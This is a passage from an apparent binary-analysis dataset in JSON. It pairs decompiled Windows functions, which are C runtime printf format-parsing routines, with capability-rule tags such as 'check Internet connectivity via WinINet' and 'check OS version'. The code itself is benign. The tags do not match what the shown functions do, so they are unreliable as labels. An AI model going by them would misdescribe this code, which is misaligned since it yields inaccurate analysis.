        "decompiled_code": "\nuint64_t fcn.14000d418(int64_t arg1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    \n    iVar1 = *(arg1 + 0x34);\n    if (iVar1 < 6) {\n        if (iVar1 != 5) {\n            if (iVar1 != 0) {\n                if (iVar1 == 1) {\n                    uVar2 = *(arg1 + 0x28);\n                    iVar4 = 1;\n                    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n                    if ((uVar2 >> 4 & 1) == 0) {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    else {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    goto code_r0x00014000d483;\n                }\n                iVar1 = iVar1 + -2;\n                if (iVar1 == 0) {\n                    uVar2 = *(arg1 + 0x28);\n                    iVar4 = 2;\n                    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n                    if ((uVar2 >> 4 & 1) == 0) {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    else {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    goto code_r0x00014000d483;\n                }\n                goto code_r0x00014000d456;\n            }\ncode_r0x00014000d553:\n            uVar2 = *(arg1 + 0x28);\n            iVar4 = 4;\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n            if ((uVar2 >> 4 & 1) == 0) {\n                uVar3 = *(*(arg1 + 0x18) + -8);\n            }\n            else {\n                uVar3 = *(*(arg1 + 0x18) + -8);\n            }\n            goto code_r0x00014000d483;\n        }\n    }\n    else if (((iVar1 != 6) && (iVar1 != 7)) && (iVar1 = iVar1 + -9,  iVar1 != 0)) {\ncode_r0x00014000d456:\n        if (iVar1 == 1) goto code_r0x00014000d553;\n        if (iVar1 != 2) {\n            iVar4 = *(arg1 + 8);\n            *(iVar4 + 0x30) = 1;\n            *(iVar4 + 0x2c) = 0x16;\n            uVar3 = fcn.14000bf58(0, 0, 0, 0);\n            return uVar3 & 0xffffffffffffff00;\n        }\n    }\n    uVar2 = *(arg1 + 0x28);\n    iVar4 = 8;\n    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n    uVar3 = *(*(arg1 + 0x18) + -8);\ncode_r0x00014000d483:\n    if (((uVar2 >> 4 & 1) != 0) && (uVar3 < 0)) {\n        uVar3 = -uVar3;\n        uVar2 = uVar2 | 0x40;\n        *(arg1 + 0x28) = uVar2;\n    }\n    if (*(arg1 + 0x30) < 0) {\n        *(arg1 + 0x30) = 1;\n    }\n    else {\n        *(arg1 + 0x28) = uVar2 & 0xfffffff7;\n        fcn.14000c4a8(arg1 + 0x50, *(arg1 + 0x30), *(arg1 + 8));\n    }\n    if (uVar3 == 0) {\n        *(arg1 + 0x28) = *(arg1 + 0x28) & 0xffffffdf;\n    }\n    *(arg1 + 0x4c) = 0;\n    if (iVar4 == 8) {\n        fcn.14000e058(arg1, uVar3);\n    }\n    else {\n        fcn.14000dcc4(arg1, uVar3 & 0xffffffff);\n    }\n    uVar2 = *(arg1 + 0x28);\n    if (((uVar2 >> 7 & 1) != 0) && ((*(arg1 + 0x48) == 0 || (**(arg1 + 0x40) != '0')))) {\n        *(arg1 + 0x40) = *(arg1 + 0x40) + -1;\n        **(arg1 + 0x40) = 0x30;\n        *(arg1 + 0x48) = *(arg1 + 0x48) + 1;\n    }\n    return CONCAT71(uVar2 >> 0xf, 1);\n}\n",
        "token_count": 1157
    },
    "14000d60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.14000d600(int64_t arg1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    \n    iVar1 = *(arg1 + 0x34);\n    if (iVar1 < 6) {\n        if (iVar1 != 5) {\n            if (iVar1 != 0) {\n                if (iVar1 == 1) {\n                    uVar2 = *(arg1 + 0x28);\n                    iVar4 = 1;\n                    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n                    if ((uVar2 >> 4 & 1) == 0) {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    else {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    goto code_r0x00014000d66b;\n                }\n                iVar1 = iVar1 + -2;\n                if (iVar1 == 0) {\n                    uVar2 = *(arg1 + 0x28);\n                    iVar4 = 2;\n                    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n                    if ((uVar2 >> 4 & 1) == 0) {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    else {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    goto code_r0x00014000d66b;\n                }\n                goto code_r0x00014000d63e;\n            }\ncode_r0x00014000d73b:\n            uVar2 = *(arg1 + 0x28);\n            iVar4 = 4;\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n            if ((uVar2 >> 4 & 1) == 0) {\n                uVar3 = *(*(arg1 + 0x18) + -8);\n            }\n            else {\n                uVar3 = *(*(arg1 + 0x18) + -8);\n            }\n            goto code_r0x00014000d66b;\n        }\n    }\n    else if (((iVar1 != 6) && (iVar1 != 7)) && (iVar1 = iVar1 + -9,  iVar1 != 0)) {\ncode_r0x00014000d63e:\n        if (iVar1 == 1) goto code_r0x00014000d73b;\n        if (iVar1 != 2) {\n            iVar4 = *(arg1 + 8);\n            *(iVar4 + 0x30) = 1;\n            *(iVar4 + 0x2c) = 0x16;\n            uVar3 = fcn.14000bf58(0, 0, 0, 0);\n            return uVar3 & 0xffffffffffffff00;\n        }\n    }\n    uVar2 = *(arg1 + 0x28);\n    iVar4 = 8;\n    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n    uVar3 = *(*(arg1 + 0x18) + -8);\ncode_r0x00014000d66b:\n    if (((uVar2 >> 4 & 1) != 0) && (uVar3 < 0)) {\n        uVar3 = -uVar3;\n        uVar2 = uVar2 | 0x40;\n        *(arg1 + 0x28) = uVar2;\n    }\n    if (*(arg1 + 0x30) < 0) {\n        *(arg1 + 0x30) = 1;\n    }\n    else {\n        *(arg1 + 0x28) = uVar2 & 0xfffffff7;\n        fcn.14000c550(arg1 + 0x50, *(arg1 + 0x30), *(arg1 + 8));\n    }\n    if (uVar3 == 0) {\n        *(arg1 + 0x28) = *(arg1 + 0x28) & 0xffffffdf;\n    }\n    *(arg1 + 0x4c) = 1;\n    if (iVar4 == 8) {\n        fcn.14000e104(arg1, uVar3);\n    }\n    else {\n        fcn.14000dd6c(arg1, uVar3 & 0xffffffff);\n    }\n    uVar2 = *(arg1 + 0x28) >> 7;\n    uVar3 = uVar2;\n    if (((uVar2 & 1) != 0) && ((uVar3 = 0,  *(arg1 + 0x48) == 0 || (**(arg1 + 0x40) != 0x30)))) {\n        *(arg1 + 0x40) = *(arg1 + 0x40) + -2;\n        **(arg1 + 0x40) = 0x30;\n        *(arg1 + 0x48) = *(arg1 + 0x48) + 1;\n    }\n    return CONCAT71(uVar3 >> 8, 1);\n}\n",
        "token_count": 1182
    },
    "14000d7e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.14000d7ec(int64_t arg1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    \n    iVar1 = *(arg1 + 0x34);\n    if (iVar1 < 6) {\n        if (iVar1 != 5) {\n            if (iVar1 != 0) {\n                if (iVar1 == 1) {\n                    uVar2 = *(arg1 + 0x28);\n                    iVar4 = 1;\n                    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n                    if ((uVar2 >> 4 & 1) == 0) {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    else {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    goto code_r0x00014000d857;\n                }\n                iVar1 = iVar1 + -2;\n                if (iVar1 == 0) {\n                    uVar2 = *(arg1 + 0x28);\n                    iVar4 = 2;\n                    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n                    if ((uVar2 >> 4 & 1) == 0) {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    else {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    goto code_r0x00014000d857;\n                }\n                goto code_r0x00014000d82a;\n            }\ncode_r0x00014000d927:\n            uVar2 = *(arg1 + 0x28);\n            iVar4 = 4;\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n            if ((uVar2 >> 4 & 1) == 0) {\n                uVar3 = *(*(arg1 + 0x18) + -8);\n            }\n            else {\n                uVar3 = *(*(arg1 + 0x18) + -8);\n            }\n            goto code_r0x00014000d857;\n        }\n    }\n    else if (((iVar1 != 6) && (iVar1 != 7)) && (iVar1 = iVar1 + -9,  iVar1 != 0)) {\ncode_r0x00014000d82a:\n        if (iVar1 == 1) goto code_r0x00014000d927;\n        if (iVar1 != 2) {\n            iVar4 = *(arg1 + 8);\n            *(iVar4 + 0x30) = 1;\n            *(iVar4 + 0x2c) = 0x16;\n            uVar3 = fcn.14000bf58(0, 0, 0, 0);\n            return uVar3 & 0xffffffffffffff00;\n        }\n    }\n    uVar2 = *(arg1 + 0x28);\n    iVar4 = 8;\n    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n    uVar3 = *(*(arg1 + 0x18) + -8);\ncode_r0x00014000d857:\n    if (((uVar2 >> 4 & 1) != 0) && (uVar3 < 0)) {\n        uVar3 = -uVar3;\n        uVar2 = uVar2 | 0x40;\n        *(arg1 + 0x28) = uVar2;\n    }\n    if (*(arg1 + 0x30) < 0) {\n        *(arg1 + 0x30) = 1;\n    }\n    else {\n        *(arg1 + 0x28) = uVar2 & 0xfffffff7;\n        fcn.14000c4a8(arg1 + 0x50, *(arg1 + 0x30), *(arg1 + 8));\n    }\n    if (uVar3 == 0) {\n        *(arg1 + 0x28) = *(arg1 + 0x28) & 0xffffffdf;\n    }\n    *(arg1 + 0x4c) = 0;\n    if (iVar4 == 8) {\n        fcn.14000e1c4(arg1, uVar3);\n    }\n    else {\n        fcn.14000de24(arg1, uVar3 & 0xffffffff);\n    }\n    uVar2 = *(arg1 + 0x28);\n    if (((uVar2 >> 7 & 1) != 0) && ((*(arg1 + 0x48) == 0 || (**(arg1 + 0x40) != '0')))) {\n        *(arg1 + 0x40) = *(arg1 + 0x40) + -1;\n        **(arg1 + 0x40) = 0x30;\n        *(arg1 + 0x48) = *(arg1 + 0x48) + 1;\n    }\n    return CONCAT71(uVar2 >> 0xf, 1);\n}\n",
        "token_count": 1162
    },
    "14000d9d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.14000d9d4(int64_t arg1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    \n    iVar1 = *(arg1 + 0x34);\n    if (iVar1 < 6) {\n        if (iVar1 != 5) {\n            if (iVar1 != 0) {\n                if (iVar1 == 1) {\n                    uVar2 = *(arg1 + 0x28);\n                    iVar4 = 1;\n                    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n                    if ((uVar2 >> 4 & 1) == 0) {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    else {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    goto code_r0x00014000da3f;\n                }\n                iVar1 = iVar1 + -2;\n                if (iVar1 == 0) {\n                    uVar2 = *(arg1 + 0x28);\n                    iVar4 = 2;\n                    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n                    if ((uVar2 >> 4 & 1) == 0) {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    else {\n                        uVar3 = *(*(arg1 + 0x18) + -8);\n                    }\n                    goto code_r0x00014000da3f;\n                }\n                goto code_r0x00014000da12;\n            }\ncode_r0x00014000db0f:\n            uVar2 = *(arg1 + 0x28);\n            iVar4 = 4;\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n            if ((uVar2 >> 4 & 1) == 0) {\n                uVar3 = *(*(arg1 + 0x18) + -8);\n            }\n            else {\n                uVar3 = *(*(arg1 + 0x18) + -8);\n            }\n            goto code_r0x00014000da3f;\n        }\n    }\n    else if (((iVar1 != 6) && (iVar1 != 7)) && (iVar1 = iVar1 + -9,  iVar1 != 0)) {\ncode_r0x00014000da12:\n        if (iVar1 == 1) goto code_r0x00014000db0f;\n        if (iVar1 != 2) {\n            iVar4 = *(arg1 + 8);\n            *(iVar4 + 0x30) = 1;\n            *(iVar4 + 0x2c) = 0x16;\n            uVar3 = fcn.14000bf58(0, 0, 0, 0);\n            return uVar3 & 0xffffffffffffff00;\n        }\n    }\n    uVar2 = *(arg1 + 0x28);\n    iVar4 = 8;\n    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n    uVar3 = *(*(arg1 + 0x18) + -8);\ncode_r0x00014000da3f:\n    if (((uVar2 >> 4 & 1) != 0) && (uVar3 < 0)) {\n        uVar3 = -uVar3;\n        uVar2 = uVar2 | 0x40;\n        *(arg1 + 0x28) = uVar2;\n    }\n    if (*(arg1 + 0x30) < 0) {\n        *(arg1 + 0x30) = 1;\n    }\n    else {\n        *(arg1 + 0x28) = uVar2 & 0xfffffff7;\n        fcn.14000c550(arg1 + 0x50, *(arg1 + 0x30), *(arg1 + 8));\n    }\n    if (uVar3 == 0) {\n        *(arg1 + 0x28) = *(arg1 + 0x28) & 0xffffffdf;\n    }\n    *(arg1 + 0x4c) = 1;\n    if (iVar4 == 8) {\n        fcn.14000e250(arg1, uVar3);\n    }\n    else {\n        fcn.14000deb0(arg1, uVar3 & 0xffffffff);\n    }\n    uVar2 = *(arg1 + 0x28) >> 7;\n    uVar3 = uVar2;\n    if (((uVar2 & 1) != 0) && ((uVar3 = 0,  *(arg1 + 0x48) == 0 || (**(arg1 + 0x40) != 0x30)))) {\n        *(arg1 + 0x40) = *(arg1 + 0x40) + -2;\n        **(arg1 + 0x40) = 0x30;\n        *(arg1 + 0x48) = *(arg1 + 0x48) + 1;\n    }\n    return CONCAT71(uVar3 >> 8, 1);\n}\n",
        "token_count": 1181
    },
    "14000e59": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.14000e59c(int64_t arg1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    int64_t iVar4;\n    \n    iVar4 = *(arg1 + 8);\n    if (*(arg1 + 0x460) == 0) {\n        *(iVar4 + 0x30) = 1;\n        *(iVar4 + 0x2c) = 0x16;\ncode_r0x00014000e5d1:\n        fcn.14000bf58(0, 0, 0, 0);\n    }\n    else {\n        cVar1 = fcn.1400101c8(*(arg1 + 0x460));\n        if (cVar1 != '\\0') {\n            if (*(arg1 + 0x10) == 0) {\n                iVar4 = *(arg1 + 8);\n                *(iVar4 + 0x30) = 1;\n                *(iVar4 + 0x2c) = 0x16;\n                fcn.14000bf58(0, 0, 0, 0);\n                return 0xffffffff;\n            }\n            *(arg1 + 0x468) = *(arg1 + 0x468) + 1;\n            iVar2 = *(arg1 + 0x468);\n            do {\n                if (iVar2 == 2) {\n                    return *(arg1 + 0x20);\n                }\n                *(arg1 + 0x48) = 0;\n                *(arg1 + 0x24) = 0;\n                cVar1 = **(arg1 + 0x10);\n                *(arg1 + 0x10) = *(arg1 + 0x10) + 1;\n                *(arg1 + 0x39) = cVar1;\n                while ((cVar1 != '\\0' && (-1 < *(arg1 + 0x20)))) {\n                    uVar3 = 0;\n                    if (cVar1 - 0x20U < 0x5b) {\n                        uVar3 = *((cVar1 - 0x20U & 0x7f) * 2 + 0x14002d861);\n                    }\n                    uVar3 = *((*(arg1 + 0x24) + uVar3 * 8 & 0x7f) * 2 + 0x14002d860);\n                    *(arg1 + 0x24) = uVar3;\n                    if (7 < uVar3) {\ncode_r0x00014000e910:\n                        iVar4 = *(arg1 + 8);\n                        *(iVar4 + 0x30) = 1;\n                        *(iVar4 + 0x2c) = 0x16;\n                        goto code_r0x00014000e5d1;\n                    }\n                    if (uVar3 == 0) {\n                        iVar4 = *(arg1 + 8);\n                        *(arg1 + 0x4c) = 0;\n                        if (*(iVar4 + 0x28) == '\\0') {\n                            fcn.140010150(iVar4);\n                            cVar1 = *(arg1 + 0x39);\n                        }\n                        if ((-2 < cVar1) && ((*(**(iVar4 + 0x18) + cVar1 * 2) & 0x8000) != 0)) {\n                            if ((((*(*(arg1 + 0x460) + 0x14) >> 0xc & 1) == 0) || (*(*(arg1 + 0x460) + 8) != 0)) &&\n                               (iVar2 = fcn.140010f8c(cVar1 & 0xffffffff, *(arg1 + 0x460), *(arg1 + 8)),  iVar2 == -1))\n                            {\n                                *(arg1 + 0x20) = 0xffffffff;\n                            }\n                            else {\n                                *(arg1 + 0x20) = *(arg1 + 0x20) + 1;\n                            }\n                            cVar1 = **(arg1 + 0x10);\n                            *(arg1 + 0x10) = *(arg1 + 0x10) + 1;\n                            *(arg1 + 0x39) = cVar1;\n                            if (cVar1 == '\\0') {\n                                iVar4 = *(arg1 + 8);\n                                *(iVar4 + 0x30) = 1;\n                                *(iVar4 + 0x2c) = 0x16;\n                                fcn.14000bf58(0, 0, 0, 0);\n                                goto code_r0x00014000e910;\n                            }\n                        }\n                        if ((((*(*(arg1 + 0x460) + 0x14) >> 0xc & 1) == 0) || (*(*(arg1 + 0x460) + 8) != 0)) &&\n                           (iVar2 = fcn.140010f8c(cVar1, *(arg1 + 0x460), *(arg1 + 8)),  iVar2 == -1)) {\n                            *(arg1 + 0x20) = 0xffffffff;\n                        }\n                        else {\n                            *(arg1 + 0x20) = *(arg1 + 0x20) + 1;\n                        }\n                    }\n                    else if (uVar3 == 1) {\n                        *(arg1 + 0x28) = 0;\n                        *(arg1 + 0x38) = 0;\n                        *(arg1 + 0x30) = 0xffffffff;\n                        *(arg1 + 0x34) = 0;\n                        *(arg1 + 0x4c) = 0;\n                    }\n                    else if (uVar3 == 2) {\n                        if (cVar1 == ' ') {\n                            *(arg1 + 0x28) = *(arg1 + 0x28) | 2;\n                        }\n                        else if (cVar1 == '#') {\n                            *(arg1 + 0x28) = *(arg1 + 0x28) | 0x20;\n                        }\n                        else if (cVar1 == '+') {\n                            *(arg1 + 0x28) = *(arg1 + 0x28) | 1;\n                        }\n                        else if (cVar1 == '-') {\n                            *(arg1 + 0x28) = *(arg1 + 0x28) | 4;\n                        }\n                        else if (cVar1 == '0') {\n                            *(arg1 + 0x28) = *(arg1 + 0x28) | 8;\n                        }\n                    }\n                    else {\n                        if (uVar3 == 3) {\n                            if (cVar1 == '*') {\n                                *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n                                iVar2 = *(*(arg1 + 0x18) + -8);\n                                *(arg1 + 0x2c) = iVar2;\n                                if (iVar2 < 0) {\n                                    *(arg1 + 0x28) = *(arg1 + 0x28) | 4;\n                                    *(arg1 + 0x2c) = -iVar2;\n                                }\ncode_r0x00014000e769:\n                                cVar1 = '\\x01';\n                            }\n                            else {\n                                iVar4 = arg1 + 0x2c;\ncode_r0x00014000e719:\n                                cVar1 = fcn.14000e47c(arg1, iVar4);\n                            }\n                        }\n                        else {\n                            if (uVar3 == 4) {\n                                *(arg1 + 0x30) = 0;\n                                goto code_r0x00014000e8ab;\n                            }\n                            if (uVar3 == 5) {\n                                if (cVar1 == '*') {\n                                    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n                                    iVar2 = *(*(arg1 + 0x18) + -8);\n                                    if (iVar2 < 0) {\n                                        iVar2 = -1;\n                                    }\n                                    *(arg1 + 0x30) = iVar2;\n                                    goto code_r0x00014000e769;\n                                }\n                                iVar4 = arg1 + 0x30;\n                                goto code_r0x00014000e719;\n                            }\n                            if (uVar3 == 6) {\n                                cVar1 = fcn.14000ec04(arg1);\n                            }\n                            else {\n                                if (uVar3 != 7) {\n                                    return 0xffffffff;\n                                }\n                                cVar1 = fcn.14000ef34(arg1);\n                            }\n                        }\n                        if (cVar1 == '\\0') {\n                            return 0xffffffff;\n                        }\n                    }\ncode_r0x00014000e8ab:\n                    cVar1 = **(arg1 + 0x10);\n                    *(arg1 + 0x10) = *(arg1 + 0x10) + 1;\n                    *(arg1 + 0x39) = cVar1;\n                }\n                *(arg1 + 0x468) = *(arg1 + 0x468) + 1;\n                iVar2 = *(arg1 + 0x468);\n            } while( true );\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 2054
    },
    "14000e92": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.14000e928(int64_t arg1)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint uVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    \n    iVar6 = *(arg1 + 8);\n    if (*(arg1 + 0x460) == 0) {\n        *(iVar6 + 0x30) = 1;\n        *(iVar6 + 0x2c) = 0x16;\ncode_r0x00014000ebe6:\n        fcn.14000bf58(0, 0, 0, 0);\ncode_r0x00014000ebff:\n        uVar3 = 0xffffffff;\n    }\n    else if (*(arg1 + 0x10) == 0) {\n        *(iVar6 + 0x30) = 1;\n        *(iVar6 + 0x2c) = 0x16;\n        fcn.14000bf58(0, 0, 0, 0);\n        uVar3 = 0xffffffff;\n    }\n    else {\n        *(arg1 + 0x468) = *(arg1 + 0x468) + 1;\n        iVar5 = *(arg1 + 0x468);\n        while (iVar5 != 2) {\n            *(arg1 + 0x48) = 0;\n            *(arg1 + 0x24) = 0;\n            uVar1 = **(arg1 + 0x10);\n            *(arg1 + 0x10) = *(arg1 + 0x10) + 1;\n            *(arg1 + 0x3a) = uVar1;\n            if (uVar1 != 0) {\n                do {\n                    iVar5 = *(arg1 + 0x20);\n                    if (iVar5 < 0) break;\n                    uVar4 = 0;\n                    if (uVar1 - 0x20 < 0x5b) {\n                        uVar4 = *((uVar1 - 0x20 & 0x7f) * 2 + 0x14002d961);\n                    }\n                    uVar4 = *((uVar4 * 9 + *(arg1 + 0x24) & 0x7f) * 2 + 0x14002d960);\n                    *(arg1 + 0x24) = uVar4;\n                    if (7 < uVar4) goto code_r0x00014000ebd3;\n                    if (uVar4 == 0) {\n                        *(arg1 + 0x4c) = 1;\n                        iVar6 = *(arg1 + 0x460);\n                        if (*(iVar6 + 0x10) == *(iVar6 + 8)) {\n                            if (*(iVar6 + 0x18) == '\\0') {\n                                *(arg1 + 0x20) = 0xffffffff;\n                            }\n                            else {\n                                *(arg1 + 0x20) = iVar5 + 1;\n                            }\n                        }\n                        else {\n                            *(arg1 + 0x20) = iVar5 + 1;\n                            *(iVar6 + 0x10) = *(iVar6 + 0x10) + 1;\n                            ***(arg1 + 0x460) = uVar1;\n                            **(arg1 + 0x460) = **(arg1 + 0x460) + 2;\n                        }\n                    }\n                    else if (uVar4 == 1) {\n                        *(arg1 + 0x28) = 0;\n                        *(arg1 + 0x38) = 0;\n                        *(arg1 + 0x30) = 0xffffffff;\n                        *(arg1 + 0x34) = 0;\n                        *(arg1 + 0x4c) = 0;\n                    }\n                    else if (uVar4 == 2) {\n                        if (uVar1 == 0x20) {\n                            *(arg1 + 0x28) = *(arg1 + 0x28) | 2;\n                        }\n                        else if (uVar1 == 0x23) {\n                            *(arg1 + 0x28) = *(arg1 + 0x28) | 0x20;\n                        }\n                        else if (uVar1 == 0x2b) {\n                            *(arg1 + 0x28) = *(arg1 + 0x28) | 1;\n                        }\n                        else if (uVar1 == 0x2d) {\n                            *(arg1 + 0x28) = *(arg1 + 0x28) | 4;\n                        }\n                        else if (uVar1 == 0x30) {\n                            *(arg1 + 0x28) = *(arg1 + 0x28) | 8;\n                        }\n                    }\n                    else {\n                        if (uVar4 == 3) {\n                            if (uVar1 == 0x2a) {\n                                *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n                                iVar5 = *(*(arg1 + 0x18) + -8);\n                                *(arg1 + 0x2c) = iVar5;\n                                if (iVar5 < 0) {\n                                    *(arg1 + 0x28) = *(arg1 + 0x28) | 4;\n                                    *(arg1 + 0x2c) = -iVar5;\n                                }\ncode_r0x00014000ead2:\n                                cVar2 = '\\x01';\n                            }\n                            else {\n                                iVar6 = arg1 + 0x2c;\ncode_r0x00014000ea82:\n                                cVar2 = fcn.14000e50c(arg1, iVar6);\n                            }\n                        }\n                        else {\n                            if (uVar4 == 4) {\n                                *(arg1 + 0x30) = 0;\n                                goto code_r0x00014000eb7b;\n                            }\n                            if (uVar4 == 5) {\n                                if (uVar1 == 0x2a) {\n                                    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n                                    iVar5 = *(*(arg1 + 0x18) + -8);\n                                    if (iVar5 < 0) {\n                                        iVar5 = -1;\n                                    }\n                                    *(arg1 + 0x30) = iVar5;\n                                    goto code_r0x00014000ead2;\n                                }\n                                iVar6 = arg1 + 0x30;\n                                goto code_r0x00014000ea82;\n                            }\n                            if (uVar4 == 6) {\n                                cVar2 = fcn.14000ed88(arg1);\n                            }\n                            else {\n                                if (uVar4 != 7) goto code_r0x00014000ebff;\n                                cVar2 = fcn.14000f368(arg1);\n                            }\n                        }\n                        if (cVar2 == '\\0') goto code_r0x00014000ebff;\n                    }\ncode_r0x00014000eb7b:\n                    uVar1 = **(arg1 + 0x10);\n                    *(arg1 + 0x10) = *(arg1 + 0x10) + 1;\n                    *(arg1 + 0x3a) = uVar1;\n                } while (uVar1 != 0);\n                if ((*(arg1 + 0x24) != '\\0') && (*(arg1 + 0x24) != '\\a')) {\ncode_r0x00014000ebd3:\n                    iVar6 = *(arg1 + 8);\n                    *(iVar6 + 0x30) = 1;\n                    *(iVar6 + 0x2c) = 0x16;\n                    goto code_r0x00014000ebe6;\n                }\n            }\n            *(arg1 + 0x468) = *(arg1 + 0x468) + 1;\n            iVar5 = *(arg1 + 0x468);\n        }\n        uVar3 = *(arg1 + 0x20);\n    }\n    return uVar3;\n}\n",
        "token_count": 1791
    },
    "14000ec0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.14000ec04(uint8_t *arg1)\n\n{\n    int32_t *arg4;\n    int64_t *arg1_00;\n    uint8_t uVar1;\n    uint32_t uVar2;\n    char *pcVar3;\n    ulong uVar4;\n    bool bVar5;\n    char cVar6;\n    int32_t iVar7;\n    uint64_t in_RAX;\n    char *pcVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    uchar uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    uchar auStack120 [32];\n    ulong uStack88;\n    uint uStack72;\n    uchar auStack68 [4];\n    ulong uStack64;\n    uint64_t uStack56;\n    \n    uVar1 = arg1[0x39];\n    pcVar8 = in_RAX & 0xffffffffffffff00;\n    if (uVar1 != 0x46) {\n        if (uVar1 == 0x4e) {\n            if ((*arg1 & 8) != 0) goto code_r0x00014000ed81;\n            arg1[0x24] = 8;\n        }\n        else if (*(arg1 + 0x34) == 0) {\n            if (uVar1 == 0x49) {\n                pcVar3 = *(arg1 + 0x10);\n                cVar6 = *pcVar3;\n                if (cVar6 == '3') {\n                    if (pcVar3[1] == '2') {\n                        pcVar8 = pcVar3 + 2;\n                        *(arg1 + 0x34) = 10;\n                        *(arg1 + 0x10) = pcVar8;\n                    }\n                }\n                else if (cVar6 == '6') {\n                    if (pcVar3[1] == '4') {\n                        pcVar8 = pcVar3 + 2;\n                        *(arg1 + 0x34) = 0xb;\n                        *(arg1 + 0x10) = pcVar8;\n                    }\n                }\n                else if ((cVar6 + 0xa8U < 0x21) && ((0x120821001U >> (cVar6 + 0xa8U & 0x3f) & 1) != 0)) {\n                    *(arg1 + 0x34) = 9;\n                }\n            }\n            else if (uVar1 == 0x4c) {\n                *(arg1 + 0x34) = 8;\n            }\n            else if (uVar1 == 0x54) {\n                *(arg1 + 0x34) = 0xd;\n            }\n            else {\n                if (uVar1 == 0x68) {\n                    if (**(arg1 + 0x10) == 'h') {\n                        *(arg1 + 0x10) = *(arg1 + 0x10) + 1;\n                        pcVar8 = 0x1;\n                    }\n                    else {\n                        pcVar8 = 0x2;\n                    }\n                }\n                else {\n                    if (uVar1 == 0x6a) {\n                        *(arg1 + 0x34) = 5;\n                        goto code_r0x00014000ed81;\n                    }\n                    if (uVar1 != 0x6c) {\n                        if (uVar1 == 0x74) {\n                            *(arg1 + 0x34) = 7;\n                        }\n                        else if (uVar1 == 0x77) {\n                            *(arg1 + 0x34) = 0xc;\n                        }\n                        else if (uVar1 == 0x7a) {\n                            *(arg1 + 0x34) = 6;\n                        }\n                        goto code_r0x00014000ed81;\n                    }\n                    if (**(arg1 + 0x10) == 'l') {\n                        *(arg1 + 0x10) = *(arg1 + 0x10) + 1;\n                        pcVar8 = 0x4;\n                    }\n                    else {\n                        